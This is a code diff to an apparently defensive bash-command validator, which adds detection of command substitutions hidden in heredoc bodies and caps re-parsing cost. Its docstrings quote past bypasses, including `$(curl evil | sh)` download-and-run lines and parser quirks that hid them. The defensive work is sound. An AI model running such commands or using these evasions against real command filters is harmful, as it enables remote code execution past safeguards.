@@ -42,6 +42,43 @@ MAX_SUBSTITUTION_DEPTH = 10
 # expansion body is worth re-parsing (see _substitutions_in_parameter).
 _SUBSTITUTION_INTRODUCERS: tuple[str, ...] = ("$(", "`", "<(", ">(")
 
+# The same question for an UNQUOTED heredoc body. Narrower than the set above because this
+# one is only a short-circuit, not a decision: the decode decides, and the double-quote
+# wrapper already renders <( / >( inert (bash prints them verbatim from a heredoc body).
+# Carrying them over would not change a verdict - it would only spend a ~100us re-parse on
+# every body containing "<(", and fail closed on one that also breaks the wrapper.
+_HEREDOC_SUBSTITUTION_INTRODUCERS: tuple[str, ...] = ("$(", "`")
+
+# How many heredoc bodies one top-level validation may re-parse before it gives up and denies.
+# MAX_SUBSTITUTION_DEPTH does NOT bound this: a heredoc nested in a substitution nested in a
+# heredoc re-parses the whole remaining inner text at every level, which measured 1.1s on a
+# 470-byte command at 14 levels (~0ms before this extraction existed) and keeps climbing. The
+# hook runs before every bash call, so that is a denial of service an attacker picks. A real
+# command has one or two heredocs; exhausting this means hand-built nesting, and exhaustion
+# DENIES rather than skipping, so the cap cannot be used to hide a payload behind depth.
+_MAX_HEREDOC_REPARSES = 16
+
+
+def _as_double_quoted(body: str) -> str:
+    """Re-spell a heredoc body as the inside of a double-quoted string.
+
+    The two contexts share every escape (``\\$``, ``\\```, ``\\\\``, ``\\<newline>``) but one:
+    ``"`` is ordinary text in a heredoc body and a terminator inside double quotes. So
+    escape each ``"``, and make the backslash run in front of it EVEN first - otherwise a
+    body's literal ``\\"`` would close the wrapper and the parse would fail closed on
+    everyday content (JSON with escaped quotes). Everything else passes through untouched,
+    which is what keeps ``\\$(x)`` non-expanding in both.
+
+    The run is collapsed to two rather than doubled. Doubling is the obvious spelling and it
+    AMPLIFIES: a heredoc nested in a heredoc re-spells an already-re-spelled body, so a
+    200-backslash run became 400, 800, 1600 - 10s of re-parsing on a 2KB command, on a hook
+    that runs before every bash call. Collapsing is a fixed point, so nesting is flat. The
+    exact count of literal backslashes is not information anything downstream reads; only
+    whether the ``"`` is escaped, which is parity, which collapsing preserves.
+    """
+    return re.sub(r'(\\*)"', lambda m: ("\\\\" if m.group(1) else "") + r"\"", body)
+
+
 # Operators bashlex emits in a command-list node's parts. A well-formed list strictly alternates
 # segment/operator and ends on a segment; anything else is a malformed AST -> fail closed.
 _LIST_OPERATORS: frozenset[str] = frozenset({"&&", "||", ";", "&"})
@@ -1093,24 +1130,37 @@ class SubstitutionValidator:
         self.parser = parser
         self.rule_engine = rule_engine
 
-    def extract_substitutions(self, ast_nodes: list[Any], depth: int = 0) -> list[SubstitutionNode]:
+    def extract_substitutions(
+        self,
+        ast_nodes: list[Any],
+        depth: int = 0,
+        command: str | None = None,
+        budget: list[int] | None = None,
+    ) -> list[SubstitutionNode]:
         """Extract all substitution nodes from AST.
 
         Args:
             ast_nodes: List of bashlex AST nodes
             depth: Current nesting depth
+            budget: Shared heredoc re-parse allowance; see _MAX_HEREDOC_REPARSES.
+            command: The source text these nodes were parsed from. Optional only so the
+                existing call sites keep working; pass it whenever you have it. A heredoc
+                body cannot be read faithfully without it (see _substitutions_in_heredoc),
+                and its absence costs a fail-closed deny rather than a silent allow.
 
         Returns:
             List of SubstitutionNode objects representing all substitutions
         """
         substitutions: list[SubstitutionNode] = []
+        if budget is None:
+            budget = [_MAX_HEREDOC_REPARSES]
 
         def visit(node: Any, current_depth: int) -> None:
             if not hasattr(node, "kind"):
                 return
 
             if node.kind == "commandsubstitution":
-                sub_node = self._create_substitution_node(node, SubstitutionType.COMMAND, current_depth)
+                sub_node = self._create_substitution_node(node, SubstitutionType.COMMAND, current_depth, command, budget)
                 if sub_node:
                     substitutions.append(sub_node)
                 return  # Don't recurse into substitution here - handled by _create_substitution_node
@@ -1118,14 +1168,22 @@ class SubstitutionValidator:
             if node.kind == "processsubstitution":
                 # Determine if input <(cmd) or output >(cmd)
                 sub_type = SubstitutionType.PROCESS_INPUT  # Default, could enhance detection
-                sub_node = self._create_substitution_node(node, sub_type, current_depth)
+                sub_node = self._create_substitution_node(node, sub_type, current_depth, command, budget)
                 if sub_node:
                     substitutions.append(sub_node)
                 return
 
             if node.kind == "parameter":
-                substitutions.extend(self._substitutions_in_parameter(node, current_depth))
+                substitutions.extend(self._substitutions_in_parameter(node, current_depth, budget))
                 return
+
+            if node.kind == "redirect":
+                # No `return`: the loop below still has to walk the redirect's `output` target
+                # (`cat < <(git push)`, `cat > $(evil)`). The heredoc body is the one child that
+                # loop cannot reach, because bashlex leaves it unparsed on `HeredocNode.value`.
+                substitutions.extend(
+                    self._substitutions_in_heredoc(getattr(node, "heredoc", None), current_depth, command, budget)
+                )
 
             # Recurse into child nodes. `output` and `redirects` reach substitutions used
             # as redirection TARGETS - `cat < <(git push)`, `echo x > >(cmd)`,
@@ -1135,7 +1193,7 @@ class SubstitutionValidator:
             # its redirections off `redirects` and never `parts`, so `output` alone
             # reaches the simple form and misses every compound one. An fd-duplication target is an
             # int with no `kind` and falls straight back out of visit(). `heredoc` stays
-            # off the list: its body has its own mechanism.
+            # off the list: the redirect branch above reads its body.
             for attr in ["parts", "command", "list", "pipe", "compound", "output", "redirects"]:
                 if hasattr(node, attr):
                     child = getattr(node, attr)
@@ -1150,7 +1208,7 @@ class SubstitutionValidator:
 
         return substitutions
 
-    def _substitutions_in_parameter(self, node: Any, depth: int) -> list[SubstitutionNode]:
+    def _substitutions_in_parameter(self, node: Any, depth: int, budget: list[int] | None = None) -> list[SubstitutionNode]:
         """Extract substitutions written inside a ``${…}`` expansion body.
 
         SECURITY (LAB-1731): bashlex's ``parameter`` node is CHILDLESS, so a ``$( )``,
@@ -1164,9 +1222,17 @@ class SubstitutionValidator:
         judge it the same way they judge a bare ``$( )``. That keeps ``${z:-$(date)}`` allowed
         instead of blanket-denying every expansion containing a ``$``.
 
-        Node positions in the returned subtree are relative to the expansion body, not to the
-        outer command. Nothing on the validation path reads them — in particular do NOT wire
-        ``_find_outer_command`` (whose own docstring invites exactly that) into this path.
+        Node positions in the returned subtree are relative to the re-parsed text, not to the
+        outer command -- so the re-parsed text is what is threaded down as ``command``. One
+        thing reads it: ``_substitutions_in_heredoc`` slices ``command`` by node position to
+        read a body faithfully. Handed the OUTER command instead, a heredoc nested in this
+        body was sliced from the wrong string, saw no introducer, and returned nothing --
+        while the whitelisted ``$(date)`` decoded beside it kept the fail-closed fallback
+        from firing. ``echo "${x:-$(date) cat <<IN`` / ``$(curl evil|sh)`` / ``IN }"`` was
+        ALLOWED/SAFE while bash ran it. Still do NOT wire ``_find_outer_command`` (whose own
+        docstring invites exactly that) into this path: it walks the top-level ``ast_nodes``,
+        where this subtree does not exist, so it would name the outer command for a body it
+        never saw.
 
         THE RE-PARSE IS THE DANGEROUS PART, because the body's real lexical context is inside
         ``${…}`` but bashlex is handed a command line. Two consequences, both found by the
@@ -1205,12 +1271,13 @@ class SubstitutionValidator:
             return []
 
         if depth < MAX_SUBSTITUTION_DEPTH:
+            reparsed = value.replace("#", "_")
             try:
-                inner_ast = self.parser.parse(value.replace("#", "_"))
+                inner_ast = self.parser.parse(reparsed)
             except Exception as exc:  # noqa: BLE001 - any decode failure is treated as suspicious
                 logger.debug("Unparseable parameter expansion body %r: %s", value, exc)
             else:
-                decoded = self.extract_substitutions(inner_ast, depth + 1)
+                decoded = self.extract_substitutions(inner_ast, depth + 1, reparsed, budget)
                 if decoded:
                     return decoded
 
@@ -1225,7 +1292,116 @@ class SubstitutionValidator:
             )
         ]
 
-    def _create_substitution_node(self, node: Any, sub_type: SubstitutionType, depth: int) -> SubstitutionNode | None:
+    def _substitutions_in_heredoc(
+        self, node: Any, depth: int, command: str | None = None, budget: list[int] | None = None
+    ) -> list[SubstitutionNode]:
+        r"""Extract substitutions written inside an unquoted-delimiter heredoc body.
+
+        SECURITY (LAB-2756): ``HeredocNode`` carries its body as unparsed text and hangs off
+        ``RedirectNode.heredoc``, which the walk above never visited. A ``$( )`` in the body
+        was therefore invisible to Layer 4, while bash expands it before the receiving
+        command sees a byte -- so ``cat <<EOF`` / ``$(curl evil | sh)`` / ``EOF`` executed
+        and scored ALLOWED/SAFE. Same class as the ``${...}`` hole; see
+        _substitutions_in_parameter above for the shared reasoning about re-parsing an
+        unparsed body, and both of its traps, which apply here verbatim.
+
+        READ THE BODY FROM THE SOURCE, NOT FROM ``.value``. bashlex strips ``\`` + newline as
+        a line continuation WITHOUT honouring backslash escaping, so a body line ending in an
+        EVEN backslash run loses one and glues the survivor to the next line's first
+        character. When that character is ``$``, ``.value`` reads ``\$(`` -- an escaped
+        dollar -- and the decode comes back empty on a body bash really expands. Measured:
+        ``cat <<EOF`` / ``line \\`` / ``$(curl evil | sh)`` / ``EOF`` was ALLOWED/SAFE while
+        bash ran it. Idiomatic in LaTeX, Makefiles, regexes and Windows paths, so it is
+        content an attacker can hide behind. ``heredoc.pos`` spans the real text; slice it.
+        When no source is available the mangling is still DETECTABLE -- a rewritten value is
+        a different length from its own span -- so that case fails closed instead of
+        trusting a body we know bashlex has edited.
+
+        THE RE-PARSE IS THE DANGEROUS PART, and the lexical context is the whole of it. The
+        body is not a command line: POSIX says an unquoted heredoc body is treated as a
+        DOUBLE-QUOTED STRING, so that is what bashlex is handed, ``echo "<body>"``. That one
+        wrapper is the fix, and it buys three things a bare re-parse does not have:
+
+        1. ``#`` is literal inside double quotes, as it is in a heredoc body -- so the
+           comment-truncation trap that forced ``#``-blanking one function up never opens.
+        2. Prose stays prose. ``Built at $(date). Don't forget.`` is a MatchedPairError to a
+           bare re-parse, which fail-closed would deny an everyday ``cat <<EOF > notes.md``.
+        3. The escapes agree with bash: ``\$(x)`` and ``$$(x)`` expand in neither model.
+
+        Verified by differential fuzz against real bash rather than reasoned about: generated
+        bodies across both models, zero cases where bash expanded and this decode was blind,
+        zero where it fired on text bash leaves literal. A subset is pinned by
+        TestModelAgreesWithBash, so a bashlex that drifts from bash fails CI, not open.
+
+        A SUCCESSFUL parse that finds nothing is a finding, not a refusal: bashlex just
+        applied the same double-quote lexer bash applies. Denying it anyway would block the
+        canonical literal-dollar idiom (``echo \$(date)`` in a heredoc that writes a script)
+        for no attacker. The refusal case -- parse raised, or the body was mangled beyond
+        recovery -- still denies.
+
+        Node positions in the returned subtree are relative to the wrapper, not to the outer
+        command -- so the wrapper is what is threaded down as ``command``, because a heredoc
+        nested inside this body slices ``command`` by those positions (the paragraph on
+        reading the body from the source, one level down). Handed the outer command it read
+        a shifted slice of the wrong string. Do NOT wire ``_find_outer_command`` into this
+        path, for the reason given one function up.
+
+        Cost: a substring scan for a body carrying no introducer, which is every everyday
+        shape -- config files, commit bodies, plain text. A body that does carry one
+        re-parses once, linear in body length. Deliberately uncapped: a size cap that skipped
+        validation would fail OPEN on exactly the payload this exists to catch.
+        """
+        value = getattr(node, "value", None)
+        if not isinstance(value, str):
+            return []
+
+        pos = getattr(node, "pos", None)
+        start, stop = pos if isinstance(pos, tuple) and len(pos) == 2 else (None, None)
+        if start is None or stop is None:
+            source = value
+        elif command is not None:
+            source = command[start:stop]
+        elif stop - start != len(value):
+            # bashlex rewrote the body and we cannot recover it. Do not read the edit.
+            source = None
+        else:
+            source = value
+
+        body, _, _ = (source or value).rpartition("\n")
+        if not any(intro in body for intro in _HEREDOC_SUBSTITUTION_INTRODUCERS):
+            return []
+
+        if budget is None:
+            budget = [_MAX_HEREDOC_REPARSES]
+        if source is not None and depth < MAX_SUBSTITUTION_DEPTH and budget[0] > 0:
+            budget[0] -= 1
+            wrapper = f'echo "{_as_double_quoted(body)}"'
+            try:
+                inner_ast = self.parser.parse(wrapper)
+            except Exception as exc:  # noqa: BLE001 - any decode failure is treated as suspicious
+                logger.debug("Unparseable heredoc body %r: %s", body, exc)
+            else:
+                return self.extract_substitutions(inner_ast, depth + 1, wrapper, budget)
+
+        return [
+            SubstitutionNode(
+                substitution_type=SubstitutionType.COMMAND,
+                inner_command=body,
+                base_command=None,
+                ast_node=node,
+                nested_substitutions=[],
+                depth=depth,
+            )
+        ]
+
+    def _create_substitution_node(
+        self,
+        node: Any,
+        sub_type: SubstitutionType,
+        depth: int,
+        command: str | None = None,
+        budget: list[int] | None = None,
+    ) -> SubstitutionNode | None:
         """Create a SubstitutionNode from an AST node.
 
         Args:
@@ -1273,7 +1449,7 @@ class SubstitutionValidator:
         if depth < MAX_SUBSTITUTION_DEPTH and hasattr(node, "command"):
             try:
                 inner_ast = [node.command] if node.command else []
-                nested = self.extract_substitutions(inner_ast, depth + 1)
+                nested = self.extract_substitutions(inner_ast, depth + 1, command, budget)
             except Exception:  # noqa: S110 - Parse errors treated as suspicious AST
                 nested = []  # Failed to parse nested - treat as no nested subs
 
@@ -2165,16 +2341,17 @@ class SubstitutionValidator:
         except ValueError:
             return RiskLevel.BLOCKED  # Unknown risk level - be safe
 
-    def validate_all_substitutions(self, ast_nodes: list[Any]) -> list[SubstitutionValidationResult]:
+    def validate_all_substitutions(self, ast_nodes: list[Any], command: str | None = None) -> list[SubstitutionValidationResult]:
         """Validate all substitutions in an AST.
 
         Args:
             ast_nodes: The parsed AST nodes
+            command: The source text these nodes were parsed from; see extract_substitutions.
 
         Returns:
             List of validation results for each substitution found
         """
-        substitutions = self.extract_substitutions(ast_nodes)
+        substitutions = self.extract_substitutions(ast_nodes, command=command)
         results: list[SubstitutionValidationResult] = []
 
         for sub in substitutions:
